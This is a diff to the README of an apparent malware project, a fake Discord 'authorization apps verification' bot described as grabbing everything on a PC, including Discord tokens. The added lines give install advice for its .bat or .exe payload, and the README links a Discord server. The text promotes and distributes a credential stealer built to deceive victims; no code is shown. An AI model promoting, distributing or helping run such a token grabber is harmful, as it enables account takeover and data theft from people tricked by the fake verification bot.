@@ -1,6 +1,9 @@
 # Force-AuthorizationAppsGrabber
 Discord Bot Authorization Apps that Grabs everything on Pc Including Discord Tokens
 
+( If You Install the .bat file it will sometimes Crash. It's not something that happens Rare 
+it's a Command that's why! If you .bat doesn't install then install the .exe )
+
 Discord Official Server : https://discord.gg/VMsgKYRYxM
 
 <h1 align="center">[Discord] - Fake Authorization Apps Verification Bot (V1.0.0)
